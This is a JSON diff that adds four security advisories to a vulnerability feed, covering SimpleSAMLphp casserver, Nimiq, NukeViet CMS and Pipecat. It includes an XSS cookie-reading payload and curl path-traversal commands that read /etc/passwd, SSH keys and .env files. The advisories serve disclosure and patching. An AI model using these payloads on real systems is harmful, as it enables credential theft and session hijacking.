@@ -1,5 +1,123 @@
 {
-  "candidate_count": 0,
-  "candidates": [],
-  "correlated_at": "2026-05-15T16:27:19.069031+00:00"
+  "candidate_count": 4,
+  "candidates": [
+    {
+      "canonical_id": "CVE-2025-65954",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-601"
+      ],
+      "description": "### Summary\n\nThe logout endpoint accepts a `url` query parameter to redirect to.  casserver treats that url as trusted, and either (depending on configuration) redirects the browser there, or shows a \"you've been logged out\" page with a link to continue to that url.\n\nThere are a number of other things broken with logout in 7 (cas v3 uses a different query parameters, etc)\n\n### Details\n\nhttps://github.com/simplesamlphp/simplesamlphp-module-casserver/blob/21418f7efbea8c4f078fd4a7d1b9eacf94dd4941/src/Controller/LogoutController.php#L104\n\nPrevious module checked the url against the valid service urls.\n\n### PoC\n\nThe docker instructions from the README.md run an image with a vulnerable config. \n\nAccessing  https://localhost/cas/logout?url=https://google.com  will redirect to Google\n\n### Impact\n\nImpacted configs have\n\n```php\n'enable_logout' => true,\n```\n\nand are most impacted if they also have\n\n```\n'skip_logout_page' -> true,\n```",
+      "first_seen": "2026-05-15T16:58:18.078598+00:00",
+      "frameworks": [
+        "composer"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-15T16:58:18.078598+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-cvrm-5hp6-h523",
+        "https://github.com/simplesamlphp/simplesamlphp-module-casserver/blob/21418f7efbea8c4f078fd4a7d1b9eacf94dd4941/src/Controller/LogoutController.php#L104",
+        "https://github.com/simplesamlphp/simplesamlphp-module-casserver/security/advisories/GHSA-cvrm-5hp6-h523"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "SimpleSAMLphp casserver: Open Redirect in logout"
+    },
+    {
+      "canonical_id": "CVE-2026-40092",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-252"
+      ],
+      "description": "### Impact\nA malicious network peer can crash any Nimiq full node by publishing a crafted Kademlia DHT record containing a `TaggedSigned<ValidatorRecord, KeyPair>` with a signature field whose byte length is not exactly 64. When the victim node's DHT verifier calls `TaggedSigned::verify`, execution reaches `Ed25519Signature::from_bytes(sig).unwrap()` in the `TaggedPublicKey` implementation for `Ed25519PublicKey`. The `from_bytes` call fails because `ed25519_zebra::Signature::try_from` rejects slices not 64 bytes, and the `unwrap()` panics. The BLS `TaggedPublicKey` implementation correctly returns `false` on error; only the Ed25519 implementation panics.\n\n### Patches\n[The patch for this vulnerability](https://github.com/nimiq/core-rs-albatross/pull/3708) is formally released as part of [v1.4.0](https://github.com/nimiq/core-rs-albatross/releases/tag/v1.4.0).\n\n### Workarounds\nNo known workarounds.\n\n### Resources\nSee [PR](https://github.com/nimiq/core-rs-albatross/pull/3708).",
+      "first_seen": "2026-05-15T16:58:18.078485+00:00",
+      "frameworks": [
+        "rust"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-15T16:58:18.078485+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-27w2-87xv-37c6",
+        "https://github.com/nimiq/core-rs-albatross/commit/807ee8e99a7ccdc604d49971f292854bfa36754d",
+        "https://github.com/nimiq/core-rs-albatross/pull/3708",
+        "https://github.com/nimiq/core-rs-albatross/releases/tag/v1.4.0",
+        "https://github.com/nimiq/core-rs-albatross/security/advisories/GHSA-27w2-87xv-37c6"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "nimiq-keys: Unchecked Ed25519 signature length in TaggedPublicKey::verify causes remote node panic via DHT"
+    },
+    {
+      "canonical_id": "CVE-2026-41147",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-79"
+      ],
+      "description": "### Impact\n\nNukeViet CMS <= 4.5.08 contains a Stored Cross-Site Scripting (XSS) vulnerability caused by insufficient server-side input sanitization in the Request class. The application relies primarily on client-side filtering to sanitize HTML tags and attributes in user-submitted content, which can be bypassed by intercepting and modifying HTTP requests directly (e.g., using Burp Suite).\n\nThis affects any module or functionality that accepts user HTML input through the Request class. An attacker can inject malicious payloads such as `<iframe srcdoc=\"&lt;img src=1 onerror=alert(document.cookie)&gt;\"></iframe>`, which are stored server-side and executed in the browser of any user who views the content.\n\n**Who is impacted:**\n- Administrators and moderators who view user-submitted content (e.g., contact messages, comments, or any module using the Request class for HTML input).\n- The Contact module was used as a proof of concept, but the vulnerability is not limited to this module.\n- No authentication is required to exploit this vulnerability, making it accessible to any anonymous visitor.\n\n**Potential impact includes:**\n- Session hijacking via cookie theft (for non-HttpOnly cookies)\n- Performing actions on the application under the victim's identity\n- Defacement or redirection to phishing pages\n- Phishing attacks via manipulated email notifications\n\n### Patches\n\nThis vulnerability has been fixed in NukeViet 4.5.08. Users should upgrade to version >= 4.5.08.\n\n### Workarounds\n\n- Implement server-side HTML sanitization in the Request class to strip or encode dangerous tags and attributes (e.g., `<iframe>`, `srcdoc`, event handlers such as `onerror`, `onload`).\n- Apply a Content Security Policy (CSP) header to restrict inline script execution.\n- Ensure cookies are set with the `HttpOnly` flag to mitigate cookie theft via XSS.\n\n### Resources\n\n- Affected source: https://github.com/nukeviet/nukeviet/blob/nukeviet4.5/modules/contact/funcs/main.php\n- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'): https://cwe.mitre.org/data/definitions/79.html",
+      "first_seen": "2026-05-15T16:58:18.078473+00:00",
+      "frameworks": [
+        "composer"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-15T16:58:18.078473+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-64rr-pp78-62ww",
+        "https://github.com/nukeviet/nukeviet/commit/2a0860fbe22e2f6a3b90f802bf80b25e18699611",
+        "https://github.com/nukeviet/nukeviet/releases/tag/4.5.08",
+        "https://github.com/nukeviet/nukeviet/security/advisories/GHSA-64rr-pp78-62ww"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "NukeViet CMS: Stored Cross-Site Scripting (XSS) via insufficient server-side input sanitization in Request class"
+    },
+    {
+      "canonical_id": "CVE-2026-44716",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-22"
+      ],
+      "description": "## Summary\n\nA path traversal vulnerability exists in Pipecat's development runner (`src/pipecat/runner/run.py`). When the runner is started with the `--folder` flag, it exposes a `GET /files/{filename:path}` download endpoint. The `filename` path parameter is concatenated directly onto `args.folder` with no containment check. Starlette normalises literal `../` sequences in URLs, but `%2F`-encoded slashes bypass this normalisation: the path parameter is URL-decoded *after* routing, so `..%2F..%2Fetc%2Fpasswd` resolves to a path two levels above `args.folder`. An attacker with network access to the runner can read any file the pipecat process has permission to access \u2014 including SSH private keys, credentials, and system files \u2014 with a single unauthenticated HTTP request.\n\nConfirmed on **pipecat-ai 1.1.0** (latest PyPI release) and commit `f078df78058ae82a02ce5b23e9e3a99a0917a53d`.\n\n---\n\n## Details\n\nThe vulnerable code is in `src/pipecat/runner/run.py`, inside the `_configure_server_app()` function, lines 249\u2013264:\n\n```python\n@app.get(\"/files/{filename:path}\")\nasync def download_file(filename: str):\n    \"\"\"Handle file downloads.\"\"\"\n    if not args.folder:\n        logger.warning(f\"Attempting to dowload {filename}, but downloads folder not setup.\")\n        return\n\n    file_path = Path(args.folder) / filename          # \u2190 no containment check\n    if not os.path.exists(file_path):\n        raise HTTPException(404)\n\n    media_type, _ = mimetypes.guess_type(file_path)\n\n    return FileResponse(path=file_path, media_type=media_type, filename=filename)\n```\n\n`Path(args.folder) / filename` joins the caller-supplied `filename` onto the base directory without calling `.resolve()` or checking `is_relative_to`. Python's `pathlib` does not strip `..` segments during join \u2014 only `.resolve()` does. Starlette strips literal `../` from the *URL path* before the route handler runs, but it decodes percent-encoded characters *inside* the matched path parameter value. Because `%2F` decodes to `/` after the router has already matched the route, the value that reaches `filename` can contain `/` characters, enabling directory traversal.\n\nFor example:\n\n```\nGET /files/..%2F..%2Fetc%2Fpasswd\n                   \u2193\nfilename = \"../../etc/passwd\"          (after Starlette decodes %2F)\nfile_path = Path(\"/tmp/media\") / \"../../etc/passwd\"\n          = Path(\"/tmp/media/../../etc/passwd\")\n          \u2192 resolves to /etc/passwd    (os.path.exists returns True)\n```\n\nThe endpoint has no authentication \u2014 the runner does not implement any auth layer \u2014 so the request requires no credentials.\n\n---\n\n## Proof of Concept\n\n### Step 1 \u2014 Start the Pipecat runner with `--folder`\n\nThe runner requires a bot script with a `bot()` entry point. A minimal script that keeps the HTTP server alive without any transport logic:\n\n```python\n# minimal_bot.py\nasync def bot(runner_args):\n    import asyncio\n    await asyncio.sleep(86400)\n\nif __name__ == \"__main__\":\n    from pipecat.runner.run import main\n    main()\n```\n\nStart the runner:\n\n```bash\npip install \"pipecat-ai[runner,webrtc]\"\n\nmkdir /tmp/bot_media\necho \"session transcript\" > /tmp/bot_media/recording.txt\n\npython minimal_bot.py \\\n    -t webrtc \\\n    --host 127.0.0.1 \\\n    --port 7860 \\\n    --folder /tmp/bot_media\n```\n\nExpected output:\n<img width=\"1626\" height=\"462\" alt=\"image\" src=\"https://github.com/user-attachments/assets/912e8ea2-cff9-4a36-a6be-e85091d9f89f\" />\n\n### Step 2 \u2014 Exploit\n\n```bash\n# Legitimate request \u2014 serves a file inside --folder\ncurl \"http://127.0.0.1:7860/files/recording.txt\"\n# \u2192 session transcript\n\n# Literal ../ \u2014 blocked by Starlette path normalisation\ncurl \"http://127.0.0.1:7860/files/../../etc/passwd\"\n# \u2192 {\"detail\":\"Not Found\"}\n\n# %2F-encoded separators \u2014 bypass normalisation, read /etc/passwd\ncurl \"http://127.0.0.1:7860/files/..%2F..%2Fetc%2Fpasswd\"\n# \u2192 ## User Database\n#   root:*:0:0:System Administrator:/var/root:/bin/sh\n#   ...\n\n# Read SSH private key\ncurl \"http://127.0.0.1:7860/files/..%2F..%2F..%2Fhome%2Fuser%2F.ssh%2Fid_rsa\"\n# \u2192 -----BEGIN OPENSSH PRIVATE KEY-----\n#   b3BlbnNzaC1rZXktdjEAAAA...\n\n# Read application secrets\ncurl \"http://127.0.0.1:7860/files/..%2F..%2F.env\"\n```\n\n### Confirmed results (pipecat-ai 1.1.0, tested 2026-04-29)\n\n| Request | HTTP status | Content |\n|---------|-------------|---------|\n| `GET /files/recording.txt` | 200 | Legitimate file |\n| `GET /files/../../etc/passwd` | 404 | Blocked \u2014 literal `..` normalised away |\n| `GET /files/..%2F..%2Fetc%2Fpasswd` | **200** | Full `/etc/passwd` |\n| `GET /files/..%2F..%2F..%2Fhome/\u2026/.ssh/id_rsa` | **200** | RSA private key (`BEGIN OPENSSH PRIVATE KEY`) |\n<img width=\"2222\" height=\"516\" alt=\"image\" src=\"https://github.com/user-attachments/assets/4c7a014c-8646-479a-8439-b8e722a69e49\" />\n<img width=\"1304\" height=\"314\" alt=\"image\" src=\"https://github.com/user-attachments/assets/14f71b3f-2a35-4d2b-8049-8af758fbc6ba\" />\n<img width=\"1188\" height=\"390\" alt=\"image\" src=\"https://github.com/user-attachments/assets/53fe2b33-2cd3-4745-b9f2-7aa426318e00\" />\n\n---\n\n## Impact\n\nThe `--folder` flag is a documented, first-class feature of the runner: the `runner_downloads_folder()` helper and `-f / --folder` CLI argument are part of the public API. The runner documentation includes LAN-deployment examples (`--host 192.168.1.100` for ESP32 integration). In those deployments, any host on the local network can exploit this with zero credentials.\n\nAn attacker who can reach the runner port and knows `--folder` is active can retrieve any file readable by the pipecat process:\n\n- SSH private keys and TLS certificates\n- `.env` files and application credentials\n- Database files, session tokens, API keys\n- System files such as `/etc/passwd` and `/etc/shadow` (on Linux)\n- Source code, config files, and secrets in parent directories of `--folder`\n\n---\n\n## Remediation\n\nCall `.resolve()` on both the base path and the joined path, then assert containment with `is_relative_to`:\n\n```python\n@app.get(\"/files/{filename:path}\")\nasync def download_file(filename: str):\n    if not args.folder:\n        logger.warning(f\"Attempting to dowload {filename}, but downloads folder not setup.\")\n        return\n\n    allowed_base = Path(args.folder).resolve()\n    file_path = (allowed_base / filename).resolve()   # resolve AFTER join\n\n    if not file_path.is_relative_to(allowed_base):    # containment check\n        raise HTTPException(status_code=403, detail=\"Access denied\")\n    if not file_path.exists():\n        raise HTTPException(status_code=404)\n\n    media_type, _ = mimetypes.guess_type(file_path)\n    return FileResponse(path=file_path, media_type=media_type, filename=file_path.name)\n```\n\n`Path.resolve()` expands all `..` components and follows symlinks before `is_relative_to` compares the paths, so neither `%2F`-encoded separators nor symlink chains can escape the allowed base.",
+      "first_seen": "2026-05-15T16:58:18.078434+00:00",
+      "frameworks": [
+        "pip"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-15T16:58:18.078434+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-3363-2ph6-35wh",
+        "https://github.com/pipecat-ai/pipecat/commit/7519c26ac5508573c35fa3a9c4717b013993d129",
+        "https://github.com/pipecat-ai/pipecat/pull/4417",
+        "https://github.com/pipecat-ai/pipecat/releases/tag/v1.2.0",
+        "https://github.com/pipecat-ai/pipecat/security/advisories/GHSA-3363-2ph6-35wh"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "Pipecat: Path Traversal in Pipecat Runner `/files` Endpoint \u2014 Arbitrary File Read via `%2F`-Encoded Separator"
+    }
+  ],
+  "correlated_at": "2026-05-15T16:58:23.276888+00:00"
 }
